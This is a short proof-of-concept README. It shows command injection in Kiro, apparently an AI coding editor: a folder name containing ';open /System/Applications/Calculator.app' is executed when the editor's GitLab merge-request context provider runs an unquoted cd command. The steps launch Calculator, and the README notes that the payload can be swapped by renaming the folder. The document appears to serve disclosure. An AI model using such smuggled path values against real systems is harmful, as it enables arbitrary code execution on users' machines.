# Calculator Trigger PoC

Opening this repository in **Kiro** will exercise the GitLab merge-request context provider.
Because the folder name embeds `;open /System/Applications/Calculator.app`, when the provider
runs its unquoted `cd ${workspace}; git …` command, Calculator launches automatically (or the
command will log a failure if GUI apps are blocked).

## Steps
1. `rm -f /tmp/KIRO_CALC_TEST`
2. `open -a Kiro "/Users/zero/Downloads/macOS/kiro_gitlab_calc;open /System/Applications/Calculator.app"`
3. In Kiro, trust the workspace, then ask `#` → **GitLab Merge Request** → “Summarize open merge requests”.
4. Calculator should pop, demonstrating command execution via workspace path.

You can swap the payload by renaming the folder.
